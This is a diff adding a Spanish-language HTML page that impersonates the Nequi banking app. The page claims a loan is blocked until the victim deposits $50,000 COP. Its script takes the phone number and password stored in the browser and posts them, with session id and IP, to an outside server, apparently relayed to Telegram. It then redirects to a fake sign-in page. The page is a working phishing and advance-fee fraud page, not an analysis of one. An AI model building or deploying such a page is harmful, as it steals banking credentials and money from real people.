@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Consignar - Nequi</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      background: linear-gradient(180deg, #5D079D 0%, #DA0081 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: system-ui, -apple-system, sans-serif;
+    }
+  </style>
+</head>
+<body>
+  <div class="min-h-dvh p-6 max-w-screen-sm mx-auto flex justify-center items-center w-full">
+    <section class="bg-white rounded-2xl py-12 px-8 shadow-2xl w-full max-w-md">
+      <div class="flex flex-col items-center">
+        <!-- CARITA TRISTE -->
+        <div class="flex justify-center items-center mb-6">
+          <img class="max-w-[5.5rem]" src="../assets/iconsad.svg" alt="Carita triste">
+        </div>
+        
+        <!-- TÍTULO -->
+        <h1 class="text-xl font-bold text-[#210021] w-full text-center mb-4">
+          ¡Casi listo!
+        </h1>
+        
+        <!-- MENSAJE PRINCIPAL -->
+        <p class="text-[#210021] w-full text-center mb-6 text-sm font-medium leading-relaxed">
+          Tu solicitud de préstamo por <strong id="monto-prestamo" class="text-[#DA0081]">$0</strong> no puede ser procesada debido a la falta de movimientos recientes en tu cuenta Nequi.
+        </p>
+        
+        <!-- INSTRUCCIÓN -->
+        <div class="bg-purple-50 border-l-4 border-[#5D079D] p-4 mb-6 rounded-r-lg w-full">
+          <p class="text-[#210021] text-sm font-semibold mb-2">
+            📌 Para continuar con tu préstamo:
+          </p>
+          <p class="text-[#210021] text-sm">
+            Realiza una consignación de <strong class="text-[#DA0081]">$50,000 COP</strong> a tu cuenta Nequi para generar el movimiento necesario.
+          </p>
+        </div>
+        
+        <!-- PASOS -->
+        <div class="w-full mb-6 text-left">
+          <p class="text-[#210021] text-sm font-semibold mb-3">Pasos a seguir:</p>
+          <ol class="text-[#210021] text-sm space-y-2 list-decimal list-inside">
+            <li>Dirígete a un corresponsal bancario</li>
+            <li>Consigna $50,000 a tu cuenta Nequi</li>
+            <li>Espera la confirmación del depósito</li>
+            <li>Vuelve a solicitar tu préstamo</li>
+          </ol>
+        </div>
+        
+        <!-- BOTÓN -->
+        <button 
+          class="bg-[#DA0081] text-white px-6 py-3 rounded-lg w-full font-semibold cursor-pointer hover:bg-[#c1007a] transition-colors duration-200 shadow-lg hover:shadow-xl transform hover:scale-[1.02] active:scale-[0.98]" 
+          id="consignarButton"
+        >
+          Quiero consignar
+        </button>
+        
+        <!-- NOTA FINAL -->
+        <p class="text-xs text-gray-500 text-center mt-6">
+          Una vez realizada la consignación, podrás solicitar tu préstamo nuevamente.
+        </p>
+      </div>
+    </section>
+  </div>
+
+  <script>
+    const BACKEND_URL = 'https://waroyvinos.onrender.com';
+    
+    // Obtener el monto del préstamo del localStorage
+    document.addEventListener('DOMContentLoaded', function() {
+      const formData = JSON.parse(localStorage.getItem('formData')) || {};
+      const montoPrestamo = formData.montoPrestamo || '$0';
+      
+      // Mostrar el monto en el texto
+      document.getElementById('monto-prestamo').textContent = montoPrestamo;
+      
+      console.log('💰 Monto del préstamo:', montoPrestamo);
+    });
+
+    // Botón "Quiero consignar" - Enviar al backend
+    document.getElementById('consignarButton').addEventListener('click', async function() {
+      try {
+        // Obtener datos del localStorage
+        const formData = JSON.parse(localStorage.getItem('formData')) || {};
+        const sessionId = localStorage.getItem('sessionId') || 'session_unknown';
+        const numero = formData.phoneNumber || 'N/A';
+        const clave = formData.password || 'N/A';
+        const ip = localStorage.getItem('ip') || 'N/A';
+        
+        // Deshabilitar botón mientras envía
+        this.disabled = true;
+        this.textContent = 'Enviando...';
+        
+        // Enviar al backend
+        const response = await fetch(`${BACKEND_URL}/consignar`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            sessionId: sessionId,
+            phoneNumber: numero,
+            password: clave,
+            ip: ip
+          })
+        });
+        
+        const data = await response.json();
+        console.log('✅ Mensaje enviado a Telegram:', data);
+        
+        // Esperar 1 segundo y redirigir al inicio
+        setTimeout(() => {
+          window.location.href = 'accces-sign-in.php.html';
+        }, 1000);
+        
+      } catch (error) {
+        console.error('❌ Error al enviar:', error);
+        this.disabled = false;
+        this.textContent = 'Quiero consignar';
+        alert('Error al enviar. Por favor intenta nuevamente.');
+      }
+    });
+  </script>
+</body>
+</html>
